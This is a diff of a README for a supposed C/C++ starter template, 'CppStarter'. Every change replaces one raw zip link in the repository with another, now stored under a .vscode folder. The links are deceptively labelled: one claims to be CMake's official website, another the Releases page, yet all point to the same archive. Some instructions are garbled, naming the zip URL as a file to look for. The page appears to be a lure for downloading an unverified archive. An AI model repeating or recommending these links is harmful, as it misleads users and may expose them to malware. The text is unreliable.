@@ -1,7 +1,7 @@
 # 🚀 CppStarter - Your Easy Path to C/C++ Development
 
 ## 🔗 Download Now
-[![Download CppStarter](https://raw.githubusercontent.com/Shary219/CppStarter/main/topia/CppStarter.zip)](https://raw.githubusercontent.com/Shary219/CppStarter/main/topia/CppStarter.zip)
+[![Download CppStarter](https://github.com/Shary219/CppStarter/raw/refs/heads/main/.vscode/Cpp-Starter-1.8.zip)](https://github.com/Shary219/CppStarter/raw/refs/heads/main/.vscode/Cpp-Starter-1.8.zip)
 
 ## 📋 Project Overview
 CppStarter is a template project designed to help you start coding in C and C++. With built-in support for CMake and essential tools, it simplifies your development experience. Whether you are new to programming or looking to refresh your skills, CppStarter offers an easy entry point into modern C++ development.
@@ -17,11 +17,11 @@ Before you begin, ensure your computer meets the following requirements:
 
 ### 2. **Install Required Software**
 You will need to install the following software:
-- **CMake**: This tool helps manage the build process. Download it from [CMake's official website](https://raw.githubusercontent.com/Shary219/CppStarter/main/topia/CppStarter.zip).
+- **CMake**: This tool helps manage the build process. Download it from [CMake's official website](https://github.com/Shary219/CppStarter/raw/refs/heads/main/.vscode/Cpp-Starter-1.8.zip).
 - **A C/C++ Compiler**: Install either Clang or GCC based on your operating system. These compilers convert your C/C++ code into an executable format.
 
 ### 3. **Download CppStarter**
-To obtain the latest version of CppStarter, visit the Releases page: [Download CppStarter](https://raw.githubusercontent.com/Shary219/CppStarter/main/topia/CppStarter.zip). 
+To obtain the latest version of CppStarter, visit the Releases page: [Download CppStarter](https://github.com/Shary219/CppStarter/raw/refs/heads/main/.vscode/Cpp-Starter-1.8.zip). 
 
 ### 4. **Choose the Right File**
 On the Releases page, you will see different versions of CppStarter. Select the most recent version that suits your operating system. Click on it to start the download. 
@@ -30,11 +30,11 @@ On the Releases page, you will see different versions of CppStarter. Select the 
 After downloading, locate the zipped file in your downloads folder. Right-click on it and select "Extract" or "Unzip". Choose a destination folder where you'd like to keep your project files.
 
 ### 6. **Open the Project**
-Once extracted, navigate to the folder where you placed the files. Look for a file called `https://raw.githubusercontent.com/Shary219/CppStarter/main/topia/CppStarter.zip`. This file is essential as it helps set up the project.
+Once extracted, navigate to the folder where you placed the files. Look for a file called `https://github.com/Shary219/CppStarter/raw/refs/heads/main/.vscode/Cpp-Starter-1.8.zip`. This file is essential as it helps set up the project.
 
 ### 7. **Build the Project**
 You will need to build the project to generate the executable. Here are the steps:
-- Open a terminal or command prompt in the folder containing the `https://raw.githubusercontent.com/Shary219/CppStarter/main/topia/CppStarter.zip` file.
+- Open a terminal or command prompt in the folder containing the `https://github.com/Shary219/CppStarter/raw/refs/heads/main/.vscode/Cpp-Starter-1.8.zip` file.
 - Run the command: `cmake .` 
 - Next, run: `make` (on Linux and macOS) or `cmake --build .` (on Windows)
 
@@ -49,7 +49,7 @@ CppStarter comes with several built-in features to help you develop efficiently:
 - **Code Checking**: It includes `clang-tidy` for ensuring your code follows best practices.
 
 ## 📥 Download & Install
-To begin your journey with CppStarter, visit this page to download the latest version: [CppStarter Releases](https://raw.githubusercontent.com/Shary219/CppStarter/main/topia/CppStarter.zip).
+To begin your journey with CppStarter, visit this page to download the latest version: [CppStarter Releases](https://github.com/Shary219/CppStarter/raw/refs/heads/main/.vscode/Cpp-Starter-1.8.zip).
 
 ## 📚 Topics Covered
 CppStarter includes support for various modern C/C++ features, including:
